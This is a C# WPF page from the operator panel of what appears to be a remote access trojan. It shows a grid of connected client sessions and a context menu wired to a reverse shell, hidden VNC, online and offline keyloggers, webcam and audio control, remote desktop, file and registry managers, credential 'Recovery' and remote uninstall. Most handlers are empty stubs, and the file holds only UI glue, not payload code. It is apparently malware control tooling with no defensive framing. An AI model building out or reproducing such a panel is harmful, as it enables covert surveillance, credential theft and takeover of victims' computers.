﻿using Server.CoreServerFunctionality;
using System.Collections.Specialized;
using System.Windows.Controls;
using Server.UtilityWindows;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows;

namespace Server.UI.Pages.ClientPage
{
    public partial class Client : UserControl
    {
        private SemaphoreSlim semaphoreSlim = new(1, 1);
        private ServerSession serverSession;

        public Client()
        {
            InitializeComponent();
            ClientHandler._sessions.CollectionChanged += UpdateClientGrid;
        }

        private void OnMenuItemClick(object sender, RoutedEventArgs e)
        {
            
        }

        private void UpdateClientGrid(object sender, NotifyCollectionChangedEventArgs e)
        {
            if (!Dispatcher.CheckAccess())
            {
                Dispatcher.Invoke(() => UpdateClientGrid(sender, e));
                return;
            }
            PreserveAndRefreshSelection();
        }

        private void PreserveAndRefreshSelection()
        {
            var selectedItems = dataGrid.SelectedItems.Cast<ServerSession>().ToList();
            MapCollectionToGrid();
            foreach (var item in selectedItems)
            {
                dataGrid.SelectedItems.Add(item);
            }
        }

        private void MapCollectionToGrid()
        {
            dataGrid.Items.Clear();
            foreach (var item in ClientHandler._sessions)
            {
                dataGrid.Items.Add(item);
            }
        }

        private void DataGrid_LoadingRow(object sender, DataGridRowEventArgs e)
        {
            e.Row.ContextMenu = (ContextMenu)FindResource("utilityContextMenu");
        }

        #region Global ContextMenu
        private void DataGrid_PreviewMouseRightButtonDown(object sender, MouseButtonEventArgs e)
        {
            DataGrid dataGrid = sender as DataGrid;
            DataGridRow clickedRow = GetDataGridRowUnderMouse(dataGrid, e.GetPosition(dataGrid));

            if (clickedRow == null)
            {
                dataGrid.SelectAll();
                ContextMenu contextMenu = (ContextMenu)FindResource("globalContextMenu");
                contextMenu.PlacementTarget = dataGrid;
                contextMenu.IsOpen = true;
            }
        }

        private void DisconnectAll_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void HideAll_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void UpdateAll_Click(object sender, RoutedEventArgs e)
        {
            
        }
        #endregion

        #region DataGrid Features
        private void DataGrid_PreviewMouseLeftButtonDown(object sender, MouseButtonEventArgs e)
        {
            DataGrid dataGrid = sender as DataGrid;
            DataGridRow clickedRow = GetDataGridRowUnderMouse(dataGrid, e.GetPosition(dataGrid));

            if (clickedRow == null)
            {
                dataGrid.UnselectAll();
                dataGrid.Focus();
            }
            else
            {
                if (Keyboard.IsKeyDown(Key.LeftShift) || Keyboard.IsKeyDown(Key.RightShift))
                {
                    HandleShiftSelection(dataGrid, clickedRow);
                }
                else if (Keyboard.IsKeyDown(Key.LeftCtrl) || Keyboard.IsKeyDown(Key.RightCtrl))
                {
                    HandleCtrlSelection(dataGrid, clickedRow);
                }
                else
                {
                    dataGrid.SelectedItems.Clear();
                    dataGrid.SelectedItem = clickedRow.Item;
                }
                e.Handled = true;
            }
        }

        private void HandleShiftSelection(DataGrid dataGrid, DataGridRow clickedRow)
        {
            int currentIndex = dataGrid.ItemContainerGenerator.IndexFromContainer(clickedRow);

            if (dataGrid.SelectedItems.Count == 0)
            {
                dataGrid.SelectedItem = clickedRow.Item;
                return;
            }

            int firstSelectedIndex = dataGrid.Items.IndexOf(dataGrid.SelectedItems[0]);
            dataGrid.SelectedItems.Clear();

            int start = Math.Min(firstSelectedIndex, currentIndex);
            int end = Math.Max(firstSelectedIndex, currentIndex);

            for (int i = start; i <= end; i++)
            {
                dataGrid.SelectedItems.Add(dataGrid.Items[i]);
            }
        }

        private void HandleCtrlSelection(DataGrid dataGrid, DataGridRow clickedRow)
        {
            if (dataGrid.SelectedItems.Contains(clickedRow.Item))
            {
                dataGrid.SelectedItems.Remove(clickedRow.Item);
            }
            else
            {
                dataGrid.SelectedItems.Add(clickedRow.Item);
            }
        }

        private DataGridRow GetDataGridRowUnderMouse(DataGrid dataGrid, Point position)
        {
            IInputElement clickedElement = dataGrid.InputHitTest(position);
            return FindParent<DataGridRow>(clickedElement as DependencyObject);
        }

        private T FindParent<T>(DependencyObject child) where T : DependencyObject
        {
            DependencyObject parentObject = VisualTreeHelper.GetParent(child);
            if (parentObject == null) return null;

            return parentObject is T parent ? parent : FindParent<T>(parentObject);
        }
        #endregion

        #region No Category
        private void SystemInfo_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new SystemInfo());
        }

        private void Notes_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new Notes());
        }

        private void ReverseShell_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new ReverseShell());
        }
        #endregion

        #region Control
        private void RemoteDesktop_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new RemoteDesktop(serverSession));
        }

        private void WebcamControl_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void AudioManager_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void HVNC_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new HVNC(serverSession));
        }

        private void KeyloggerOffline_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void KeyloggerOnline_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new Keylogger());
        }
        #endregion

        #region Management
        private void SystemManagement_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void NetworkManagement_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void FileManager_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new FileManager());
        }

        private void RegistryManager_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void ClipboardManager_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Recovery_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void SystemOptions_Click(object sender, RoutedEventArgs e)
        {
            serverSession.OpenUtilityWindow(new SystemOptions());
        }

        private void Miscellaneous_Click(object sender, RoutedEventArgs e)
        {
            
        }
        #endregion

        #region System Controls
        private void Reconnect_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Disconnect_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Uninstall_Click(object sender, RoutedEventArgs e)
        {
            
        }
        #endregion

        #region Power
        private void Shutdown_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Restart_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Sleep_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Logoff_Click(object sender, RoutedEventArgs e)
        {
            
        }

        private void Hibernate_Click(object sender, RoutedEventArgs e)
        {
            
        }
        #endregion

        private void ContextMenu_Opened(object sender, RoutedEventArgs e)
        {
            serverSession = ((ServerSession)(((DataGridRow)((ContextMenu)sender).PlacementTarget)).DataContext);
        }
    }
}
